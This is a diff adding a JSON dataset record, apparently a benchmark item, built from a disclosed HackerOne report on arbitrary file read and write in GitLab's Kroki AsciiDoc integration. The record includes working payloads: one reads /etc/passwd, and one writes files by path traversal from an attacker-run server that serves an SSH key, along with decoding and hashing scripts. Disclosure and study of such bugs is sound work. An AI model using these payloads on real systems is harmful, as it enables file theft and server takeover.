@@ -1,0 +1,56 @@
+{
+  "reported_to": "GitLab",
+  "reported_by": "ledz1996 ",
+  "title": "Kroki Arbitrary File Read/Write ",
+  "content": "\nSummary\nIn short, I've found a potentially weird bug in asciidoctor that could lead to arbitrary file read/write in asciidoctor-kroki even though Gitlab have already made an attempt to disable kroki-plantuml-include\nlib/gitlab/asciidoc.rb\nCode 1.12 KiB\n1module Gitlab\n2  # Parser/renderer for the AsciiDoc format that uses Asciidoctor and filters\n3  # the resulting HTML through HTML pipeline filters.\n4  module Asciidoc\n5    MAX_INCLUDE_DEPTH = 5\n6    MAX_INCLUDES = 32\n7    DEFAULT_ADOC_ATTRS = {\n8        'showtitle' => true,\n9        'sectanchors' => true,\n10        'idprefix' => 'user-content-',\n11        'idseparator' => '-',\n12        'env' => 'gitlab',\n13        'env-gitlab' => '',\n14        'source-highlighter' => 'gitlab-html-pipeline',\n15        'icons' => 'font',\n16        'outfilesuffix' => '.adoc',\n17        'max-include-depth' => MAX_INCLUDE_DEPTH,\n18        # This feature is disabled because it relies on File#read to read the file.\n19        # If we want to enable this feature we will need to provide a \"GitLab compatible\" implementation.\n20        # This attribute is typically used to share common config (skinparam...) across all PlantUML diagrams.\n21        # The value can be a path or a URL.\n22        'kroki-plantuml-include!' => '',\n23        # This feature is disabled because it relies on the local file system to save diagrams retrieved from the Kroki server.\n24        'kroki-fetch-diagram!' => ''\nHowever this could easily be bypassed by using counter\nhttps://github.com/asciidoctor/asciidoctor/blob/master/lib/asciidoctor/document.rb\nCode 467 Bytes\n1  def counter name, seed = nil\n2    return @parent_document.counter name, seed if @parent_document\n3    if (attr_seed = !(attr_val = @attributes[name]).nil_or_empty?) && (@counters.key? name)\n4      @attributes[name] = @counters[name] = Helpers.nextval attr_val\n5    elsif seed\n6      @attributes[name] = @counters[name] = seed == seed.to_i.to_s ? seed.to_i : seed\n7    else\n8      @attributes[name] = @counters[name] = Helpers.nextval attr_seed ? attr_val : 0\n9    end\n10  end\nSteps to reproduce\nSet up Gitlab with Kroki: https://docs.gitlab.com/ee/administration/integration/kroki.html Arbitrary FIle Read\nCreate a project, create a wiki page with asciidoctor format and the following as payload\nCode 289 Bytes\n1[#goals]\n2\n3[plantuml, test=\"{counter:kroki-plantuml-include:/etc/passwd}\", format=\"png\"]\n4....\n5class BlockProcessor\n6class DiagramBlock\n7class DitaaBlock\n8class PlantUmlBlock\n9\n10BlockProcessor <|-- {counter:kroki-plantuml-include}\n11DiagramBlock <|-- DitaaBlock\n12DiagramBlock <|-- PlantUmlBlock\n13....\nGet the base64 part of the URL of the image when being rendered\nUse the following code to decode the last part of the URL to get the content of file /etc/passwd\nCode 210 Bytes\n1require 'base64'\n2require 'zlib'\n3\n4\n5test = \"eNpLzkksLlZwyslPzg4oyk9OLS7OL-JKBgu6ZCamFyXmguXgQiWJicgCATmJeSWhuTkQMS5UcxRsanR1FTJSM1K5kM2CCCMZhSmJYiwAy8U5sQ==\"\n6p Zlib::Inflate.inflate(Base64.urlsafe_decode64(test))\nVideo:\nArbitrary FIle Write\nCreate a project, create a wiki page with asciidoctor format and the following as payload\nCode 223 Bytes\n1[#goals]\n2:imagesdir: .\n3:outdir: /tmp/\n4\n5[plantuml]\n6....\n7class BlockProcessor\n8class DiagramBlock\n9class DitaaBlock\n10class PlantUmlBlock\n11\n12BlockProcessor <|-- hehe\n13DiagramBlock <|-- DitaaBlock\n14DiagramBlock <|-- PlantUmlBlock\n15....\nNote in the URL there is a base64 value, copy this value\nSet up a server with the address that is being appended as kroki-server-url,, I used this scriptto serve a public-key file with any URL.\nCode 1.98 KiB\n1/// python3 this_script.py <port>\n2from http.server import BaseHTTPRequestHandler, HTTPServer\n3import logging\n4\n5class S(BaseHTTPRequestHandler):\n6    def _set_response(self):\n7        self.send_response(200)\n8        self.send_header('Content-type', 'text/html')\n9        self.end_headers()\n10\n11    def do_GET(self):\n12        logging.info(\"GET request,\\nPath: %s\\nHeaders:\\n%s\\n\", str(self.path), str(self.headers))\n13        self._set_response()\n14        self.wfile.write(b\"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEY+UcYlP8VzOBdyMGUpbVFMsAUxPjWK7OiqARu/t3wO1mSNJ/RE5eaNLz5+6zM2WllUVrYF3cDXqNxge4srScM/v887Lz8mAupAZoPunxHrSTWFHjbCBaGm80z8QyStG+GMM/iN+mu4FtQ+ckMfOA8T/9k3clK3HomQXunJe85a6MPDsgE5MvEm4MdBUKQpEaEbstmAWtQIR5KCMHyNDa9WVKQQI+TJwAMpVa3L+Lbx4TZd04Fl5uKmCYUfPfBvj1/209s1XDN2rAK3AKJjAEbPVuLcZrl9iAse0FgA6HvUtA+g21VLba5OASXU/ZsedRmzECefMu8RVKHPzaaiC+RQU+1ihgBnQig0MdaXz8PZLOCo/673Pg9nsqjNafeU7fGTJD95BkkDL/3OfIEBq+rMbOyxrU+k8H+QWeVCbvh2LWRxdy/xciOMkkdodm2eGg45kJNjoDeKJEp0YpQ9ha+PdsqQqENAbqFqmYheAy1KJcpbG+U6Uik4hVXHxTAu0= ledz@ledzs-MacBook-Pro.local\")\n15\n16    def do_POST(self):\n17        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data\n18        post_data = self.rfile.read(content_length) # <--- Gets the data itself\n19        logging.info(\"POST request,\\nPath: %s\\nHeaders:\\n%s\\n\\nBody:\\n%s\\n\",\n20                str(self.path), str(self.headers), post_data.decode('utf-8'))\n21\n22        self._set_response()\n23        self.wfile.write(\"POST request for {}\".format(self.path).encode('utf-8'))\n24\n25def run(server_class=HTTPServer, handler_class=S, port=8080):\n26    logging.basicConfig(level=logging.INFO)\n27    server_address = ('0.0.0.0', port)\n28    httpd = server_class(server_address, handler_class)\n29    logging.info('Starting httpd...\\n')\n30    try:\n31        httpd.serve_forever()\n32    except KeyboardInterrupt:\n33        pass\n34    httpd.server_close()\n35    logging.info('Stopping httpd...\\n')\n36\n37if __name__ == '__main__':\n38    from sys import argv\n39\n40    if len(argv) == 2:\n41        run(port=int(argv[1]))\n42    else:\n43        run()\nNote the URL and edit the following script to create a SHA256 of the URL\nCode 301 Bytes\n1require 'digest'\n2require 'base64'\n3require 'zlib'\n4\n5string = \"http://192.168.69.1:8082/plantuml/../../../../../../tmp/test_file_write.txt/eNpLzkksLlZwyslPzg4oyk9OLS7OL-JKBgu6ZCamFyXmguXgQiWJicgCATmJeSWhuTkQMS5UcxRsanR1FTJSM1K5kM2CCCMZhSmJYiwAy8U5sQ==\"\n6\n7p \"diag-#{Digest::SHA256.hexdigest test = string}\"\nCreate a project, create a wiki page with asciidoctor format and the following as payload for the first time, replace the diag-**. with the diag-<output_previous>., Please take note of the last .\nCode 447 Bytes\n1[#goals]\n2:imagesdir: diag-58f90331904a1989259d639c5677e0fff5e434e739c70f1d3bb2004723bc99b8.\n3:outdir: /tmp/\n4\n5[plantuml, test=\"{counter:kroki-fetch-diagram:true}\",tet=\"{counter:kroki-server-url:http://192.168.69.1:8082/}\", format=\"/../../../../../../tmp/test_file_write.txt\"]\n6....\n7class BlockProcessor\n8class DiagramBlock\n9class DitaaBlock\n10class PlantUmlBlock\n11\n12BlockProcessor <|-- hehe\n13DiagramBlock <|-- DitaaBlock\n14DiagramBlock <|-- PlantUmlBlock\n15....\nSave then render\nRepeat the previous step with this payload\nCode 442 Bytes\n1[#goals]\n2:imagesdir: diag-58f90331904a1989259d639c5677e0fff5e434e739c70f1d3bb2004723bc99b8.\n3:outdir: /tmp/\n4\n5[plantuml, test=\"{counter:kroki-fetch-diagram:true}\",tet=\"{counter:kroki-server-url:http://192.168.69.1:8082/}\", format=\"/../../../../../../tmp/test_file_write.txt\"]\n6....\n7class BlockProcessor\n8class DiagramBlock\n9class DitaaBlock\n10class PlantUmlBlock\n11\n12BlockProcessor <|-- hehe\n13DiagramBlock <|-- DitaaBlock\n14DiagramBlock <|-- PlantUmlBlock\nSave then render again\nYou are able to write to any files. You can check this by simply navigate to the file using the Gitlab box\nVideo:\nResults of GitLab environment info\nCode 935 Bytes\n1System information\n2System:     Ubuntu 16.04\n3Proxy:      no\n4Current User:   git\n5Using RVM:  no\n6Ruby Version:   2.7.2p137\n7Gem Version:    3.1.4\n8Bundler Version:2.1.4\n9Rake Version:   13.0.1\n10Redis Version:  5.0.9\n11Git Version:    2.29.0\n12Sidekiq Version:5.2.9\n13Go Version: unknown\n14\n15GitLab information\n16Version:    13.7.4-ee\n17Revision:   368b4fb2eee\n18Directory:  /opt/gitlab/embedded/service/gitlab-rails\n19DB Adapter: PostgreSQL\n20DB Version: 11.9\n21URL:        http://gitlab3.example.vm\n22HTTP Clone URL: http://gitlab3.example.vm/some-group/some-project.git\n23SSH Clone URL:  git@gitlab3.example.vm:some-group/some-project.git\n24Elasticsearch:  no\n25Geo:        yes\n26Geo node:   Primary\n27Using LDAP: no\n28Using Omniauth: yes\n29Omniauth Providers:\n30\n31GitLab Shell\n32Version:    13.14.0\n33Repository storage paths:\n34- default:  /var/opt/gitlab/git-data/repositories\n35GitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell\n36Git:        /opt/gitlab/embedded/bin/git\nImpact\nFile read/write access, RCE\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": 500,
+  "weaknesses": [
+    "Improper Access Control - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1621641360,
+  "report_url": "https://hackerone.com/reports/1098793",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Set up GitLab with Kroki integration and create a project with a wiki page in AsciiDoc format."
+    ],
+    [
+      2,
+      "Use the counter function to bypass disabled attributes (kroki-plantuml-include and kroki-fetch-diagram) to perform arbitrary file read/write operations."
+    ],
+    [
+      3,
+      "For file read: Inject a payload that includes a counter to read system files like /etc/passwd, then decode the base64 URL to extract file contents."
+    ],
+    [
+      4,
+      "For file write: Set up a server to serve malicious content, use the kroki-server-url attribute to point to this server, and manipulate the imagesdir and outdir attributes to write files to arbitrary locations."
+    ]
+  ],
+  "vuln_description": "The vulnerability allows arbitrary file read and write operations in GitLab's AsciiDoc rendering via Kroki integration. By exploiting the counter function in AsciiDoctor, an attacker can bypass disabled attributes (kroki-plantuml-include and kroki-fetch-diagram) to read sensitive files or write malicious content to arbitrary locations on the server.",
+  "reason": "This vulnerability involves multiple complex steps including setting up a malicious server, understanding the counter function in AsciiDoctor, and manipulating various attributes to achieve file read/write. The interaction between these components is non-obvious and requires deep knowledge of both AsciiDoctor and Kroki integrations.",
+  "new_complexity": "HIGH",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": false,
+  "authnz_byppass_detectable": false,
+  "is_simple_payload": false,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "idor_detectable": false,
+    "authnz_byppass_detectable": false
+  }
+}
